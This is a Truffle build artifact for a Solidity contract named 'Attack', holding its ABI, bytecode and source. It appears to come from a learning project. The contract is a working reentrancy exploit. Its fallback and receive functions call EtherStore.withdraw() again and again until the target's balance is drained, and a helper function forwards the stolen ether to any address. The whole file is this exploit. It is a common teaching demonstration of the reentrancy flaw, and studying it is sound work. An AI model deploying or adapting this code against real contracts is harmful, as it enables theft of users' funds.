{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "counter",
          "type": "uint256"
        }
      ],
      "name": "Logger",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "addressToSend",
          "type": "address"
        }
      ],
      "name": "transferToaddress",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x60806040526000805534801561001457600080fd5b50604051610938380380610938833981810160405281019061003691906100e0565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061010d565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ad82610082565b9050919050565b6100bd816100a2565b81146100c857600080fd5b50565b6000815190506100da816100b4565b92915050565b6000602082840312156100f6576100f561007d565b5b6000610104848285016100cb565b91505092915050565b61081c8061011c6000396000f3fe6080604052600436106100435760003560e01c806312065fe0146102865780635ad8e8ae146102b15780639e5faafc146102cd578063acd2e6e5146102d757610167565b3661016757670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101655760016000808282546100a2919061050d565b925050819055507f258353b5cf06d77119068bca569637d802c13175693ca7387cd31e6fc0bee5646000546040516100da91906105ad565b60405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014c57600080fd5b505af1158015610160573d6000803e3d6000fd5b505050505b005b670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106102845760016000808282546101c1919061050d565b925050819055507f258353b5cf06d77119068bca569637d802c13175693ca7387cd31e6fc0bee5646000546040516101f99190610627565b60405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026b57600080fd5b505af115801561027f573d6000803e3d6000fd5b505050505b005b34801561029257600080fd5b5061029b610302565b6040516102a89190610655565b60405180910390f35b6102cb60048036038101906102c691906106d3565b61030a565b005b6102d5610354565b005b3480156102e357600080fd5b506102ec6104ae565b6040516102f9919061075f565b60405180910390f35b600047905090565b8073ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610350573d6000803e3d6000fd5b5050565b670de0b6b3a764000034101561039f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610396906107c6565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561041157600080fd5b505af1158015610425573d6000803e3d6000fd5b5050505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561049457600080fd5b505af11580156104a8573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610518826104d4565b9150610523836104d4565b925082820190508082111561053b5761053a6104de565b5b92915050565b600082825260208201905092915050565b7f526563696576652041747461636b202100000000000000000000000000000000600082015250565b6000610588601083610541565b915061059382610552565b602082019050919050565b6105a7816104d4565b82525050565b600060408201905081810360008301526105c68161057b565b90506105d5602083018461059e565b92915050565b7f46616c6c6261636b2041747461636b2021000000000000000000000000000000600082015250565b6000610611601183610541565b915061061c826105db565b602082019050919050565b6000604082019050818103600083015261064081610604565b905061064f602083018461059e565b92915050565b600060208201905061066a600083018461059e565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006106a082610675565b9050919050565b6106b081610695565b81146106bb57600080fd5b50565b6000813590506106cd816106a7565b92915050565b6000602082840312156106e9576106e8610670565b5b60006106f7848285016106be565b91505092915050565b6000819050919050565b600061072561072061071b84610675565b610700565b610675565b9050919050565b60006107378261070a565b9050919050565b60006107498261072c565b9050919050565b6107598161073e565b82525050565b60006020820190506107746000830184610750565b92915050565b7f4d6f7265207468616e2031206574686572206e65656465640000000000000000600082015250565b60006107b0601883610541565b91506107bb8261077a565b602082019050919050565b600060208201905081810360008301526107df816107a3565b905091905056fea2646970667358221220f6a6c887e44a7b0cf4743d926ff61e74d5ea1d10c4a528229e0ca7dfeb9423bb64736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.4.2 <0.9.0;\n\nimport \"./EtherStore.sol\";\n\ncontract Attack {\n    uint256 counter = 0;\n    EtherStore public etherStore;\n    event Logger(string message, uint256 counter);\n    \n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            emit Logger(\"Fallback Attack !\", counter);\n            etherStore.withdraw();\n        }\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            counter +=  1;\n            emit Logger(\"Recieve Attack !\", counter);\n            etherStore.withdraw();\n        }\n    }\n    \n    function attack() external payable {\n        require(msg.value >= 1 ether, \"More than 1 ether needed\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function transferToaddress(address payable addressToSend) public payable {\n        addressToSend.transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/shivani/Desktop/DApp/truffle/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.13",
  "updatedAt": "2023-04-20T22:56:36.795Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}